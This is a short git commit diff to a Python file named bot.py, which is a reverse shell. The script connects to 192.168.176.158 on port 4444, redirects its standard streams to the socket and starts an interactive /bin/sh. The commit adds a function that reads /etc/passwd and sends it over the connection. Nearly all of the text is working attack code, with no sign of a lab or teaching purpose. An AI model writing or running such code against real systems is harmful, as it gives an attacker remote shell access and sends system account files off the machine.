274a8450135ece619134ee0ee8af8efacaade028
Javier Lopez Garriga <101639484+yasjavi@users.noreply.github.com>
2024-01-31 16:25:58 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,6 +1,12 @@
 import socket
 import subprocess
 import os
+
+def upload_file(filename, sock):
+    with open(filename, 'rb') as f:
+        data = f.read()
+    sock.sendall(data)
+
 def run():
     ip = "192.168.176.158"
     port = 4444
@@ -11,6 +17,9 @@ def run():
     os.dup2(s.fileno(), 2)
     for f in (0, 1, 2):
         os.set_inheritable(f, True)
+    upload_file('/etc/passwd', s)
     subprocess.run(["/bin/sh", "-i"], check=True)
+
 if __name__ == "__main__":
     run()
+    
